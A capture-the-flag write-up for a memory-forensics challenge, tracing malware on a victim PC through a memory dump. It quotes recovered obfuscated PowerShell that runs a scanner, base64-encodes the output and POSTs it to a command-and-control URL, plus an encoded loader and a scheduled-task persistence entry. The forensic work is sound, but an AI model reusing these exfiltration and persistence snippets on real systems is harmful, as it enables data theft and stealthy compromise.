# Challenge

* **Points**: 470
* **Solves**: 2
* **Files**: [memory.7z](https://drive.google.com/file/d/10XZD5S2FCdPyugSvoIkWD8s3pH20hQS2/view)

```
An employee's PC at a COVID-19 vaccine manufacturer was infected with a malware. According to this employee, a strange window popped up while he was formatting his PC and installing some files. Analyze memory dumps and find traces of the malware.

    (1): Filename of the malicious executable whose execution finished at last
    (2): Filename of the executable that ran (1)
    (3): URL of C2 server that received victim's data (except http(s)://)
    Obtain all flag information and enter it in the form of pbctf{(1)_(2)_(3)}
```

# Solution

Regular [volatility](https://github.com/volatilityfoundation/volatility) and "dumb" `strings`/`grep` runs were futile at the beginning as there were loads of junk inside. After spending 3-4 hours without a proper "lead", decided to do some PCAP carving. Already prepared for some manual approach, as did in some previous similar occasions, but nevertheless gave [CapLoader](https://www.netresec.com/index.ashx?page=CapLoader) a chance. While inside of the results there were no "clear" C&C attempts, found an interesting domain `mft.fw` inside one of `Set-Cookie` headers from CloudFlare HTTP response. By visiting the same domain, found out that same domain is the personal domain of challenge author. As in similar challenges, decided to take a "shoot" and do some more `grep`-ing with that same domain on the provided memory dump. The rest is history.

So, first "obvious" malicious excerpt contacting the candidate C&C URL `mft.pw/ccc.php` (Note: **Answers the Question (3)**) found was:

```ps
s`eT-V`A`Riab`lE Diq  (  [typE]('sY'+'S'+'tEM.'+'tExT'+'.'+'EnCOdiNg')  );  Set-`VARI`A`B`le  ('Car'+'u1')  (  [TyPe]('ConveR'+'t') )  ;${i`N`V`OkEcO`MmaND} = ((('cm'+'d'+'.exe')+' /'+'c '+'C'+':'+('HaSP'+'r')+('o'+'gr')+'a'+('m'+'Dat')+'aH'+('aSnt'+'user')+'.p'+('ol'+' TC'+'P ')+('172.30'+'.1.0'+'/24 33'+'8')+('95'+'12 /'+'B'+'a')+('nne'+'r'))."REPL`A`cE"(([chaR]72+[chaR]97+[chaR]83),[STRInG][chaR]92));
${CMdout`p`Ut} = $(i`NVoK`e-eXPRE`ss`I`on ${I`NvOk`E`cOMMaND});
${B`yT`es} =   ( v`ARiA`BLE  dIQ -VALu )::"U`NI`coDe"."g`etBYTES"(${cm`DOu`TPUt});
${eN`Co`dEd} =   (  I`TEM ('VarI'+'a'+'B'+'LE'+':Caru1')  ).valuE::"ToB`AS`E`64striNG"(${b`Yt`es});
${poSTP`A`R`AmS} = @{"D`ATa"=${e`N`cOded}};
i`N`VOkE-WEb`REQuESt -Uri ('mft.pw'+'/ccc'+'c.ph'+'p') -Method ('POS'+'T') -Body ${p`o`sTpaRaMs};
```

By doing some more `grep`-ing found that the original (obfuscated) excerpt which produced the upper PowerShell excerpt was:

```ps
nEW-ObjEcT sySTEm.iO.sTreaMReAdER( ( nEW-ObjEcT  SystEm.iO.CompreSsiOn.DEfLATEstREam([IO.meMoryStream] [CoNVeRT]::fROMbASe64StRinG('NVJdb5tAEHyv1P9wQpYAuZDaTpvEVqRi+5Sgmo/Axa0VRdoLXBMUmyMGu7Es//fuQvoAN7e7Nzua3RqUcJbgQVLIJ1hzNi/eGLMYe2gOFX+0zHpl9s0Uv4YHbnu8CzwI8nIW5UX4bNqM2RPGUtU4sPQSH+mmsFbIY87kFit3A6ohVnGIFbLOdLlXCdFhAlOT3rGAEJYQvfIsgmAjw/mJXTPLssxsg3U59VTvyrT7JjvDS8bwN8NvbPYt81amMeItpi1TI3omaErK0fO5bNr7LQVkWjYkqlZtkVtRUK8xxAQxxqylGVwM3dFX6jtw6TgbnrPRCMFlm75i3xAPhq2aqUnNKFyWqhNiu0bC4wV6kXHDsh6yF5k8Xgz7Hbi6+ACXI/vLQyoSv7x5/EgNbXvy+VPvOAtyvWuggvuGvOhZaNFS/wTlqN9xwqGuwQddst7Rh3AfvQKHLAoCsq4jmMJBgKrpMbm/By8pcDQLzlju3zFn6S12zB6PjXsIfcj0XBmu8Qyqma4ETw2rd8w2MI92IGKU0HGqEGYacp7/Z2U+CB7gqJdy67c2dHYsOA0H598N33b3cr3j2EzoKXgpiv1+XjfbIryhRk+wakhq16TSqYhpKcHbpNTox9GYgyekcY0KcFGyKFf56YTF7drg1ji/+BMk/G7H04Y599sCFW3+NG71l0aXZRntjFu94FGhHidQzYvOsSiOaLsFxaY6P6CbFWioRSUTGdSnyT8=' ) , [IO.coMPressION.cOMPresSiOnmOde]::dEcOMPresS)), [TexT.ENcODInG]::AsCIi)).ReaDToeNd();;
```

Deobfuscating the first excerpt, we came to the following command, which clearly indicates the location of the malicious executable at location `C:\ProgramData\ntuser.pol` (Note: **Answers the Question (1)**):

```
cmd.exe /c C:\ProgramData\ntuser.pol TCP 172.30.1.0/24 3389512 /Banner
```

So, now, only thing which is missing from the "puzzle" is the answer to the question: `Filename of the executable that ran (1)`. This one was slightly tricky to find because A) this information is not available through standard `volatility` runs as that same executable was not running during the memory snapshot; and B) there is no standard `volatility` plugin to get the list of executables being run at OS startup.

Nevertheless, while later found that I could (easier) do the 3rd party plugin [volatility-autoruns](https://github.com/tomchop/volatility-autoruns), based the "last yard" on manually finding suspicious executable names got by inspecting `strings` and `strings -el` run results. The most promising was the following *Task Scheduler XML* entry (Note: **Found by `grep`-ing for folder `C:\ProgramData` used in case of `ntuser.pol`**):

```xml
<Task>
  ...
  <Settings>
    ...
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\ProgramData\WindowsPolicyUpdate.cmd</Command>
    </Exec>
  </Actions>
</Task>
```

Tried it as part of the flag, and it worked :)

# FLAG

`pbctf{ntuser.pol_WindowsPolicyUpdate.cmd_mft.pw/cccc.php}`
